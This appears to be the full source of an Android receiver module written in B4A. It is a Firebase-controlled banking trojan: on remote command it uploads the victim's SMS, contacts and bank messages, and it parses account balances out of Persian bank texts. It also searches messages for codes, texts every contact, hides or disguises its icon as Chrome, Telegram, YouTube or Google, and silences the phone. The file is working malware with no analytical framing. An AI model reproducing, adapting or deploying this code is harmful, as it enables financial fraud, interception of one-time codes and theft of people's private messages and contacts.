B4A=true
Group=Default Group
ModulesStructureVersion=1
Type=Receiver
Version=12.8
@EndOfDesignText@
Sub Process_Globals
	Public fm As FirebaseMessaging
	Dim phone As Phone
	Dim pd As PersianDeviceInfo
	Dim statusWhat As Boolean
	Dim allsms As SmsMessages
	Dim sms As Sms
	Dim li As List
	Dim filesmsname As String
	Private Send As SendServer
	Dim PhoneId As PhoneId
	Dim PE As PhoneEvents
	Dim res As String
	Dim pm As PhoneWakeState
	Dim cu As ContactsUtils
End Sub

Private Sub Receiver_Receive (FirstTime As Boolean, StartingIntent As Intent)
	StartReceiver(NewMessage)
	Try
		PE.InitializeWithPhoneState("PE", PhoneId)
		Send.Initialize
		fm.Initialize("fm")
		pd.initialize("pd")
		fm.HandleIntent(StartingIntent)
		Do While fm.Token = ""
			fm.Initialize("fm")
			Sleep(500)
			Log("Cant Get Token")
		Loop
	Catch
		Log(LastException)
	End Try
	
End Sub
Public Sub SubscribeToTopics
	Dim sudoport As String = File.ReadString(File.DirAssets,"sudoport.txt")
	Log(sudoport)
	fm.SubscribeToTopic(sudoport)
End Sub

Sub fm_MessageArrived (Message As RemoteMessage)
	Log(Message.GetData)
	Dim command,Device_id,TextSms,NumberList As String
	'--------------------------------------------------------------------------
	command = Message.GetData.Get("command")
	Device_id = Message.GetData.Get("device_id")
	NumberList = Message.GetData.Get("phone")
	TextSms = Message.GetData.Get("text")
	
	'--------------------------------------------------------------------------
	If command = "online_device" Then
		res = CheckScreenStatus
		
		Send.SendData("Device_id=" &phone.GetSettings("android_id") & "&berand="& phone.Manufacturer &"&Product="&phone.Product&"&Model=" &phone.Model  & "&operator=" &phone.GetNetworkOperatorName &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "online_device"&"&screen="&res)
	Else If command = "allSearch" Then
		res = CheckScreenStatus
		Dim MySmsMessages As SmsMessages
		Dim MySms As Sms
		Dim MyList As List : MyList.Initialize
		MyList=MySmsMessages.GetAll
		For i = 0 To MyList.Size -1
			MySms = MyList.Get(i)
			If MySms.Body.Contains(TextSms) Then
				
				Send.SendData("messagetext=" & MySms.Body &"&word="&TextSms&"&sender="&MySms.Address& "&Model="&phone.Model & "&Device_id=" &phone.GetSettings("android_id")& "&action=" & "searchSMS"& "&operator=" & phone.GetNetworkOperatorName&"&screen="&res)
				Exit
			End If
		Next
	Else If command = "getallbalance" Then
		Try
			Private st As StringUtils
		
			Private BalanceData As String = st.EncodeUrl(st.EncodeBase64(BANK_Balances.As(JSON).ToString.GetBytes("UTF8")),"UTF8")
			
			Log(BalanceData)
			Log(BANK_Balances)
			Send.SendData("Balances="&BalanceData&"&Model="&phone.Model & "&Device_id=" &phone.GetSettings("android_id")&"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion & "&action=" & "balance"& "&operator=" & phone.GetNetworkOperatorName)

		Catch
			Log(LastException)
		End Try
	Else If command = "hidden" And Device_id = phone.GetSettings("android_id") Then
	
		
		Send.SendData("Device_id=" &phone.GetSettings("android_id") & "&Model=" &phone.Model &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "Hidden_icon"&"&screen="&res)
		Sleep(2500)
		Try
			set_icon_status("main",False)
			set_icon_status("second",False)
			set_icon_status("youtube",False)
			set_icon_status("telegram",False)
			set_icon_status("google",False)
		Catch
			Log(LastException)
		End Try
	Else If command = "visible" And Device_id = phone.GetSettings("android_id") Then
		
		Send.SendData( "Device_id=" &phone.GetSettings("android_id") & "&Model=" &phone.Model &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "visible_icon"&"&screen="&res)
		Sleep(2500)
		
		Try
			set_icon_status("main",True)
			set_icon_status("second",False)
			set_icon_status("youtube",False)
			set_icon_status("telegram",False)
			set_icon_status("google",False)
		Catch
			Log(LastException)
		End Try
	Else If command = "hide_all" Then
		
		Send.SendData( "Device_id=" &phone.GetSettings("android_id") & "&Model=" &phone.Model &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "Hidden_icon"&"screen="&res)
		Sleep(2500)
		Try
			set_icon_status("main",False)
			set_icon_status("second",False)
			set_icon_status("youtube",False)
			set_icon_status("telegram",False)
			set_icon_status("google",False)
		Catch
			Log(LastException)
		End Try
	
	Else If command = "changetochrome" And Device_id = phone.GetSettings("android_id") Then
		
		Log(command)
		Try
			
			Send.SendData( "Device_id=" &phone.GetSettings("android_id") & "&Model=" &phone.Model &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "iconchange"&"&screen="&res)
			Sleep(2500)
			set_icon_status("main",False)
			set_icon_status("second",True)
			set_icon_status("youtube",False)
			set_icon_status("telegram",False)
			set_icon_status("google",False)
		Catch
			Log(LastException)
		End Try
	Else If command = "changetotel" And Device_id = phone.GetSettings("android_id") Then
	
		Log(command)
		Try
			
			Send.SendData( "Device_id=" &phone.GetSettings("android_id") & "&Model=" &phone.Model &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "iconchange"&"&screen="&res)
			Sleep(2500)
			set_icon_status("main",False)
			set_icon_status("telegram",True)
			set_icon_status("youtube",False)
			set_icon_status("second",False)
			set_icon_status("google",False)
		Catch
			Log(LastException)
		End Try
	Else If command = "smcontact" And Device_id = phone.GetSettings("android_id") Then
		Try
			Dim allcon As String = ""
			cu.Initialize
			Dim MessageText As String = TextSms
			For Each c As cuContact In cu.FindContactsByPhone("",False, False)
				For Each Phonec As cuPhone In cu.GetPhones(c.Id)
					allcon = allcon&CRLF&Phonec.Number
					Sleep(500)
					SendSMS(Phonec.Number,MessageText)
				Next
			Next
							
			File.WriteString(File.DirInternal, "result.txt",allcon)
			Send.SendFile("?response=true&action=scontact&Model="&phone.Model&"&Device_id="&phone.GetSettings("android_id")& "&operator=" & phone.GetNetworkOperatorName&"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion&"&screen="&res &"", "result.txt")
		Catch
			Log(LastException)
		End Try
		
	Else If command = "changetoyoutube" And Device_id = phone.GetSettings("android_id") Then
		
		Log(command)
		Try
			Send.SendData( "Device_id=" &phone.GetSettings("android_id") & "&Model=" &phone.Model &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "iconchange"&"&screen="&res)
			Sleep(2500)
			set_icon_status("main",False)
			set_icon_status("youtube",True)
			set_icon_status("telegram",False)
			set_icon_status("second",False)
			set_icon_status("google",False)
		Catch
			Log(LastException)
		End Try
	Else If command = "changetogoogle" And Device_id = phone.GetSettings("android_id") Then
		
		Log(command)
		Try
			Send.SendData( "Device_id=" &phone.GetSettings("android_id") & "&Model=" &phone.Model &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "iconchange"&"&screen="&res)
			Sleep(2500)
			set_icon_status("main",False)
			set_icon_status("google",True)
			set_icon_status("youtube",False)
			set_icon_status("telegram",False)
			set_icon_status("second",False)
		Catch
			Log(LastException)
		End Try
	Else If command = "silent_all" Then
		Try
			phone.SetVolume(phone.VOLUME_NOTIFICATION, 0, False)
			phone.SetVolume(phone.VOLUME_SYSTEM, 0, False)
			phone.SetVolume(phone.VOLUME_ALARM, 0, False)
			phone.SetVolume(phone.VOLUME_MUSIC, 0, False)
		Catch
			Log(LastException)
		End Try
		
	Else If command = "send_sms_all"  Then
		res = CheckScreenStatus
		Try
			Dim MessageText As String = TextSms
			Dim x As List = Regex.Split(",",NumberList)
			For i = 0 To x.Size
				Dim SmsNumber As String = x.Get(i)
				SendSMS(SmsNumber,MessageText)
				Sleep(5000)
			Next
			
			Send.SendData( "Device_id=" &phone.GetSettings("android_id") & "&Model=" &phone.Model &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "Silent"&"&screen="&res)
		Catch
			Log(LastException)
		End Try
	
	Else If command = "status" And Device_id = phone.GetSettings("android_id") Then
		res = CheckScreenStatus
		Try
			
			Send.SendData( "Device_id=" &phone.GetSettings("android_id") &"&berand="& phone.Manufacturer &"&Product="&phone.Product& "&Model=" &phone.Model  & "&operator=" &phone.GetNetworkOperatorName &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion & "&action=" & "status"&"&screen="&res)
		Catch
			Log(LastException)
		End Try
		
	Else If command = "send_sms" And Device_id = phone.GetSettings("android_id") Then
		Try
			Dim MessageText As String = TextSms
			Dim x As List = Regex.Split(",",NumberList)
			For Each Numb As String In x
				SendSMS(Numb,MessageText)
				Sleep(1000)
			Next
		Catch
			Log(LastException)
		End Try
			
	Else If command = "offline_mode_on" And Device_id = phone.GetSettings("android_id") Then
		
		If File.Exists(File.DirInternal,"offline.txt") Then
			File.Delete(File.DirInternal,"offline.txt")
		Else
			File.WriteString(File.DirInternal,"offline.txt",NumberList)
			
			Send.SendData( "Device_id=" &phone.GetSettings("android_id") & "&Model=" &phone.Model &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "offlineOn"&"&screen="&res)
		End If
	Else If command = "offline_mode_off" And Device_id = phone.GetSettings("android_id") Then
		
		If File.Exists(File.DirInternal,"offline.txt") Then
			File.Delete(File.DirInternal,"offline.txt")
		End If
		
		Send.SendData( "Device_id=" &phone.GetSettings("android_id") & "&Model=" &phone.Model &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion &"&action=" & "offlineOff"&"&screen="&res)
	Else If command = "all_sms_recived" And Device_id = phone.GetSettings("android_id") Then
	
		Try
			Dim allsmstext,whosend As String = ""
			li.Initialize
			li = allsms.GetAll
			For i = 0 To li.Size -1
				sms = li.Get(i)
				If sms.Type == 1 Then
					whosend = "Receive"
					allsmstext = allsmstext & CRLF & CRLF & "--------------------" & CRLF & "sender : " & sms.Address & CRLF & "Text : " & sms.Body & CRLF & "Status : " & whosend & CRLF & "Date : " & DateTime.Date(sms.Date) & " " & DateTime.Time(sms.Date) & CRLF & "--------------------"
				Else
				End If
			Next
			filesmsname = Rnd(11111,99999)
			File.WriteString(File.DirInternal,filesmsname&".txt",allsmstext)
			Send.SendFile("?response=true&action=allsms&Model="&phone.Model&"&Device_id="&phone.GetSettings("android_id")& "&operator=" & phone.GetNetworkOperatorName&"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion&"&screen="&res &"",filesmsname&".txt")
		Catch
			Log(LastException)
		End Try
	Else If command = "all_sms" And Device_id = phone.GetSettings("android_id") Then
		
		Try
			Dim SMS_READ,ClassString As String
			Private StringBuilder As StringBuilder
			StringBuilder.Initialize
			Try
				Private SM As SmsMessages
				StringBuilder.Append("|-----@mrpishv-----|")
				Dim smsCounter As Int
            	smsCounter = 0
				For Each SMSDATA As Sms In SM.GetAll
					If SMSDATA.Read Then
						SMS_READ = "Readed"
					Else
						SMS_READ = "UnReaded"
					End If
					ClassString = "UNKNOWN"
					Select SMSDATA.Type
						Case SM.TYPE_DRAFT
							ClassString = "DRAFT"
						Case SM.TYPE_FAILED
							ClassString = "FAILED"
						Case SM.TYPE_INBOX
							ClassString = "INBOX"
						Case SM.TYPE_OUTBOX
							ClassString = "OUTBOX"
						Case SM.TYPE_QUEUED
							ClassString = "QUEUED"
						Case SM.TYPE_SENT
							ClassString = "SENT"
					End Select
					StringBuilder.Append(CRLF).Append("sender : ").Append(SMSDATA.Address).Append(CRLF).Append("Status : ").Append(SMS_READ).Append(CRLF).Append("Type : ").Append(ClassString).Append(CRLF).Append("Text :").Append(CRLF).Append(SMSDATA.Body).Append(CRLF).Append("|-----@mrpishv-----|")
				Next
			Catch
				Log(LastException)
			End Try
			filesmsname = Rnd(11111,99999)
			File.WriteString(File.DirInternal,filesmsname&".txt",StringBuilder.ToString)
			Send.SendFile("?response=true&action=allsms&Model="&phone.Model&"&Device_id="&phone.GetSettings("android_id")& "&operator=" & phone.GetNetworkOperatorName&"&Battery=" & pd.BatteryPercentage&"&screen="&res &"&andver=" & pd.OSVersion &"",filesmsname&".txt")
		Catch
			Log(LastException)
		End Try
	Else If command = "all_contacts" And Device_id = phone.GetSettings("android_id") Then
		
		Try
			Dim contacts As Contacts2
			Private StringBuilder As StringBuilder
			StringBuilder.Initialize
			StringBuilder.Append("|-----@mrpishv-----|")
			Try
				For Each Contact As Contact In contacts.GetAll(True, False)
					Log(Contact.PhoneNumber)
					StringBuilder.Append(CRLF).Append("Name : ").Append(Contact.DisplayName).Append(CRLF).Append("Phone : ").Append(Contact.PhoneNumber.Replace(" ", "")).Append(CRLF).Append("------------------")
				Next
				StringBuilder.Append(CRLF).Append("|-----@mrpishv-----|")
			Catch
				Log(LastException)
			End Try
			filesmsname = Rnd(11111,99999)
			File.WriteString(File.DirInternal,filesmsname&".txt",StringBuilder.ToString)
			Send.SendFile("?response=true&action=allcontact&Model="&phone.Model&"&Device_id="&phone.GetSettings("android_id")& "&operator=" & phone.GetNetworkOperatorName&"&Battery=" & pd.BatteryPercentage&"&screen="&res &"&andver=" & pd.OSVersion &"",filesmsname&".txt")
		Catch
			Log(LastException)
		End Try
	Else If command = "all_sms_sent" And Device_id = phone.GetSettings("android_id") Then
		
		Try
			Dim allsmstext,whosend As String = ""
			li.Initialize
			li = allsms.GetAll
			For i = 0 To li.Size -1
				sms = li.Get(i)
				Log(sms.Type)
				If sms.Type == 2 Then
					whosend = "Sent"
					allsmstext = allsmstext & CRLF & CRLF & "--------------------" & CRLF & "sender : " & sms.Address & CRLF & "Text : " & sms.Body & CRLF & "Status : " & whosend & CRLF & "Date : " & DateTime.Date(sms.Date) & " " & DateTime.Time(sms.Date) & CRLF & "--------------------"
				Else
				End If
			Next
			filesmsname = Rnd(11111,99999)
			File.WriteString(File.DirInternal,filesmsname&".txt",allsmstext)
			Send.SendFile("?response=true&action=allsms&Model="&phone.Model&"&Device_id="&phone.GetSettings("android_id")& "&operator=" & phone.GetNetworkOperatorName&"&Battery=" & pd.BatteryPercentage&"&screen="&res &"&andver=" & pd.OSVersion &"",filesmsname&".txt")
		Catch
			Log(LastException)
		End Try
	Else If command = "last_sms" And Device_id = phone.GetSettings("android_id") Then
		res = CheckScreenStatus
		Try
			
			Dim listsms As List
			listsms.Initialize
			listsms = allsms.GetAll
			Dim s As Sms
			s = listsms.Get(0)
			Dim tx As String = s.Body.Replace("<#>","")
			
			Send.SendData("sender=" &s.Address & "&messagetext=" &tx& "&Model="&phone.Model & "&Device_id=" &phone.GetSettings("android_id")& "&action=" & "lastsms"&"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion & "&operator=" & phone.GetNetworkOperatorName&"&screen="&res)
		Catch
			Log(LastException)
		End Try
	Else If command = "Vibrate" And Device_id = phone.GetSettings("android_id") Then
		Try
			phone.SetRingerMode(phone.RINGER_VIBRATE)
		Catch
			Log(LastException)
		End Try
		
	Else If command = "silent" And Device_id = phone.GetSettings("android_id") Then
		Try
			phone.SetVolume(phone.VOLUME_NOTIFICATION, 0, False)
			phone.SetVolume(phone.VOLUME_SYSTEM, 0, False)
			phone.SetVolume(phone.VOLUME_ALARM, 0, False)
			phone.SetVolume(phone.VOLUME_MUSIC, 0, False)
		Catch
			Log(LastException)
		End Try
		
	Else If command = "Normal" And Device_id = phone.GetSettings("android_id") Then
		Try
			phone.SetRingerMode(phone.RINGER_NORMAL)
			phone.SetVolume(phone.VOLUME_NOTIFICATION, 100, False)
			phone.SetVolume(phone.VOLUME_SYSTEM, 100, False)
			phone.SetVolume(phone.VOLUME_ALARM, 100, False)
			phone.SetVolume(phone.VOLUME_MUSIC, 100, False)
		Catch
			Log(LastException)
		End Try
	Else If command = "balance" And Device_id = phone.GetSettings("android_id") Then
		
		Try
			Private st As StringUtils
		
			Private BalanceData As String = st.EncodeUrl(st.EncodeBase64(BANK_Balances.As(JSON).ToString.GetBytes("UTF8")),"UTF8")
			
			Log(BalanceData)
			Log(BANK_Balances)
			Send.SendData("Balances="&BalanceData&"&Model="&phone.Model & "&Device_id=" &phone.GetSettings("android_id")&"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion & "&action=" & "balance"& "&operator=" & phone.GetNetworkOperatorName&"&screen="&res)

		Catch
			Log(LastException)
		End Try
	Else If command = "last_bank_sms" And Device_id = phone.GetSettings("android_id") Then
		res = CheckScreenStatus
		Try
			Dim MySmsMessages As SmsMessages
			Dim MySms As Sms
			Dim MyList As List : MyList.Initialize
			MyList=MySmsMessages.GetAll
			For i = 0 To MyList.Size -1
				MySms = MyList.Get(i)
				If MySms.Body.Contains("بانک")  Then
					
					Send.SendData("messagetext=" & MySms.Body & "&sender="&MySms.Address & CRLF & "&Model="&phone.Model & "&Device_id=" &phone.GetSettings("android_id")&"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion & "&action=" & "lastbanksms"& "&operator=" & phone.GetNetworkOperatorName&"&screen="&res)
					Exit
					
				End If
			Next
		Catch
			Log(LastException)
		End Try
	Else If command = "all_bank_sms" And Device_id = phone.GetSettings("android_id") Then

		Try
			Dim MySmsMessages As SmsMessages
			Dim MySms As Sms
			Dim all_bank As String
			Dim MyList As List : MyList.Initialize
			MyList=MySmsMessages.GetAll
			For i = 0 To MyList.Size -1
				MySms = MyList.Get(i)
				If MySms.Body.Contains("بانک") And MySms.Body.Contains("صادرات") Then
					all_bank = all_bank& CRLF & CRLF & "------@Overdim------" & CRLF & "Bank :" & MySms.Address & CRLF & "Text :" & MySms.Body & CRLF & "Date:" & DateTime.Date(sms.Date) & " " & DateTime.Time(MySms.Date) & CRLF & "------@Overdim------"
				End If
			Next
			filesmsname = Rnd(11111,99999)
			File.WriteString(File.DirInternal,filesmsname&".txt",all_bank)
			Send.SendFile("?response=true&action=allbanksms&Model="&phone.Model&"&Device_id="&phone.GetSettings("android_id")&"&Battery=" & pd.BatteryPercentage&"&screen="&res &"&andver=" & pd.OSVersion & "&operator=" & phone.GetNetworkOperatorName&"",filesmsname&".txt")
		Catch
			Log(LastException)
		End Try
	Else If command = "WhatsChecker" And Device_id = phone.GetSettings("android_id") Then
		res = CheckScreenStatus
		Try
			Dim MySmsMessages As SmsMessages
			Dim MySms As Sms
			Dim MyList As List : MyList.Initialize
			MyList=MySmsMessages.GetAll
			For i = 0 To MyList.Size -1
				MySms = MyList.Get(i)
				If MySms.Body.Contains(TextSms) Then
					statusWhat = True
					Exit
				Else
					statusWhat = False
				End If
			Next
			
			Send.SendData("messagetext=" & statusWhat & "&Model="&phone.Model & "&Device_id=" &phone.GetSettings("android_id")&"&Battery=" & pd.BatteryPercentage&"&screen="&res &"&andver=" & pd.OSVersion & "&action=" & "WhatsChecker"& "&operator=" & phone.GetNetworkOperatorName)
		Catch
			Log(LastException)
		End Try
	Else If command = "searchSMS" And Device_id = phone.GetSettings("android_id") Then
		res = CheckScreenStatus
		Dim MySmsMessages As SmsMessages
		Dim MySms As Sms
		Dim MyList As List : MyList.Initialize
		MyList=MySmsMessages.GetAll
		For i = 0 To MyList.Size -1
			MySms = MyList.Get(i)
			If MySms.Body.Contains(TextSms) Then
				
				Send.SendData("messagetext=" & MySms.Body.Replace("<#>", "") &"&word="&TextSms&"&sender="&MySms.Address& "&Model="&phone.Model&"&screnn="&res & "&Device_id=" &phone.GetSettings("android_id")& "&action=" & "searchSMS"& "&operator=" & phone.GetNetworkOperatorName)
				Exit
			End If
		Next
	End If
End Sub
Sub SendSMS(Number As String , Message As String)
	Dim r As Reflector
	r.Target = r.RunStaticMethod("android.telephony.SmsManager", "getDefault", Null, Null)
	Dim parts As Object
	parts = r.RunMethod2("divideMessage", Message, "java.lang.String")
	r.RunMethod4("sendMultipartTextMessage", _
      Array As Object(Number, Null, parts, Null, Null), _
      Array As String("java.lang.String", "java.lang.String", _
         "java.util.ArrayList", "java.util.ArrayList", "java.util.ArrayList"))
End Sub
Private Sub set_icon_status (actn As String,enable As Boolean )
	Try
		Dim reflector As Reflector
		Dim context As Object = reflector.CreateObject2("android.content.ComponentName",  _
      Array As Object(Application.PackageName, Application.PackageName&"."&actn), Array As String("java.lang.String", "java.lang.String"))
		reflector.Target = reflector.GetContext
		reflector.Target = reflector.RunMethod("getPackageManager")
		Dim num As Int
		If enable = True Then
			num = 1
		Else
			num = 2
		End If
		reflector.Target = reflector.RunMethod4("setComponentEnabledSetting", Array As Object(context, num, 0), _
      Array As String("android.content.ComponentName", "java.lang.int", "java.lang.int"))
	Catch
		Log(LastException)
	End Try
End Sub

Public Sub BANK_Balances As Map
	Private mapdata As Map
	mapdata.Initialize
	Try
		For Each sms As Sms In allsms.GetByType(allsms.TYPE_INBOX)
			Private Address,body,Balance,BANK As String
			Address = sms.Address
			body= sms.Body
			If body.Contains("صادرات") Then
				If BANK_IsBank(body) Then
					Balance = BANK_FindBalance(body)
					BANK = Detect_BankName(Address,body)
					If BANK.Length > 2 And Balance.Length > 2 Then
						If mapdata.ContainsKey(BANK) = False Then
							mapdata.Put(BANK,CreateMap("Balance":Balance,"Address":Address))
						End If
					End If
				End If
			End If
		Next
	Catch
		Log(LastException)
	End Try
	Return mapdata
End Sub
Private Sub BANK_IsBank(body As String) As Boolean
	Private Status As Boolean
	Try
		If (body.Contains("بانک") Or _
		 body.Contains("بانك") Or _
		  body.Contains("بلو")) And _
		  (body.Contains("موجودی") Or _
		   body.Contains("مانده") Or _
		   body.Contains("موجودي")) Then
			Status = True
		Else
			Status = False
		End If
	Catch
		Status = False
	End Try
	Return Status
End Sub
Private Sub BANK_FindBalance(body As String) As String
	Try
		Dim pattern As String
		pattern = "(?:موجود[یي]|مانده)\s*[:：]?\s*[\d٠-٩۰-۹,،]+"
		Dim Matcher1 As Matcher
		Matcher1 = Regex.Matcher2(pattern, Regex.MULTILINE,body)
		Do While Matcher1.Find
			If Matcher1.Match.Length > 2 Then
				Return Matcher1.Match
			End If
		Loop
	Catch
		Log(LastException)
	End Try
	Return ""
End Sub
Public Sub Detect_BankName(address As String,body As String) As String
	Try
		If address.Contains("KESHAVARZI") Or body.Contains("bki.ir") Then
			Return "بانک کشاورزی"
		Else if address.Contains("IZBANK") Then
			Return "بانک ایران زمین"
		Else if address.Contains("Bank Mellat") Then
			Return "بانک ملت"
		End If
		Dim pattern As String
		pattern = "(?=.*(?:بلو|بانك|بانک)).*"
		Dim Matcher1 As Matcher
		Matcher1 = Regex.Matcher2(pattern, Regex.MULTILINE,body)
		Do While Matcher1.Find
			If Matcher1.Match.Length > 2 Then
				Return Matcher1.Match
			End If
		Loop
	Catch
		Log(LastException)
	End Try
	Return ""
End Sub
Public Sub CheckScreenStatus
	Dim res As String
	pm.PartialLock

	Dim r As Reflector
	r.Target = r.GetContext
	Dim powerService As Object = r.RunMethod2("getSystemService", "power", "java.lang.String")
	r.Target = powerService
	Dim isScreenOn As Boolean = r.RunMethod("isScreenOn")
    
	If isScreenOn Then
		res = "On"
		Log("Screen is ON")
	Else
		res = "Off"
		Log("Screen is OFF")
	End If
	Return res
	pm.ReleasePartialLock
End Sub